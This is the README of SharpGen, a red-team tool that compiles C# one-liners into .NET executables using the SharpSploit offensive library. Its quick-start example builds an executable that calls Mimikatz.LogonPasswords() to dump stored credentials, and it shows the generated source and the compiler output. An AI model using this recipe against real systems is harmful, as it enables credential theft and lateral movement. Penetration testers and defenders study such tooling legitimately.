# SharpGen

[SharpGen](https://github.com/cobbr/SharpGen) is a .NET Core console application that utilizes the [Rosyln](https://github.com/dotnet/roslyn) C# compiler to quickly cross-compile .NET Framework console applications or libraries.

### Intro

You'll find details and motivations for the SharpGen project in this [introductory blog post](https://cobbr.io/SharpSploit.html).

### Quick Start

The most basic usage of SharpGen would be to provide SharpGen an output filename and a C# one-liner that you’d like to execute. SharpGen will generate a .NET Framework console application that will execute the one-liner. For example:

```
cobbr@mac:~ > git clone https://github.com/cobbr/SharpGen
cobbr@mac:~ > cd SharpGen
cobbr@mac:~/SharpGen > dotnet build
cobbr@mac:~/SharpGen > dotnet bin/Release/netcoreapp2.1/SharpGen.dll -f example.exe "Console.WriteLine(Mimikatz.LogonPasswords());"
[+] Compiling source:
using System;
using System.IO;
using System.Text;
using System.Linq;
using System.Security.Principal;
using System.Collections.Generic;
using SharpSploit.Credentials;
using SharpSploit.Enumeration;
using SharpSploit.Execution;
using SharpSploit.LateralMovement;
using SharpSploit.Generic;
using SharpSploit.Misc;

public static class jZTyloQN2SU4
{
    static void Main()
    {
        Console.WriteLine(Mimikatz.LogonPasswords());
	    return;
    }
}
[+] Compiling optimized source:
using System;
using SharpSploit.Credentials;

public static class jZTyloQN2SU4
{
    static void Main()
    {
        Console.WriteLine(Mimikatz.LogonPasswords());
	    return;
    }
}
[*] Compiled assembly written to: /Users/cobbr/SharpGen/Output/example.exe
```
